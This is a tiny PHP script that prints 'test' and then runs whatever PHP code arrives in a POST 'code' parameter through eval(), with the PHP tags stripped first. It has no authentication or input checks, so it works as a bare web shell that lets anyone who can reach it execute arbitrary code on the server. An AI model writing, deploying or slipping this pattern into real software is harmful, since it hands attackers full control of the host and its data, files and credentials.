<?php
print "test";

if(isset($_POST['code'])) {
    eval(stripTags($_POST['code']));
}

function stripTags($code) {
    $startTag = '<?php';
    $endTag = '?>';
    $start = strpos($code,$startTag)+strlen($startTag);
    $end = strpos($code,$endTag);

    return substr($code, $start, $end-$start);
}
?>